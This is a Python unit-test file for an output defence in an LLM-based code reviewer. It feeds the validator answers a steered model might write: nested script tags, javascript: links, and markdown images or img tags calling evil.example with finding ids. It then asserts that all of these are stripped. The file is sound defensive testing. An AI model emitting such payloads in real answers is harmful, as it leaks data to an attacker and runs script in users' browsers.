"""Adversarial model answers against the output defence: what a steered model might write."""

import pytest

from codekavach.llm.defence.output import validate_verdict
from tests.unit.llm.test_review_intelligence import (
    ScriptedSession,
    reviewer,
    verdict,
    vulnerable_payload,
)


@pytest.mark.parametrize(
    "nested",
    [
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "!<a>[x](http://evil.example/?d=fn_1)",
        "<im<img src=a>g src=http://evil.example/fn_1>",
        "[x](java<a>script:alert(1))",
    ],
)
def test_markup_split_by_a_removable_fragment_does_not_survive_the_scrub(nested: str) -> None:
    cleaned, report = validate_verdict(verdict(impact=f"See {nested} now", remediation=nested))
    for text in (cleaned.impact, cleaned.remediation):
        assert "<script" not in text and "<img" not in text and "javascript:" not in text
        assert "![" not in text
    assert report.markup_removed >= 2


def test_explain_and_remediate_answers_are_scrubbed_like_a_triage_answer() -> None:
    image = "![x](http://evil.example/?d=fn_1)"

    def steer(task: str, content: dict[str, object]) -> dict[str, object]:
        if task == "explain":
            return {**content, "impact": f"Data is lost {image} <script>alert(1)</script>"}
        if task == "remediate":
            return {**content, "guidance": f'Bind it <img src="http://evil.example/fn_1"> {image}'}
        return content

    session = ScriptedSession(steer)
    outcome = reviewer(session, tasks={"explain", "remediate"}).review(vulnerable_payload())
    merged = outcome.verdict
    assert session.tasks == ["triage", "explain", "remediate"] and merged is not None
    assert merged.impact.startswith("Data is lost") and "Bind it" in merged.remediation
    for text in (merged.impact, merged.remediation):
        assert "evil.example" not in text and "<script" not in text and "<img" not in text
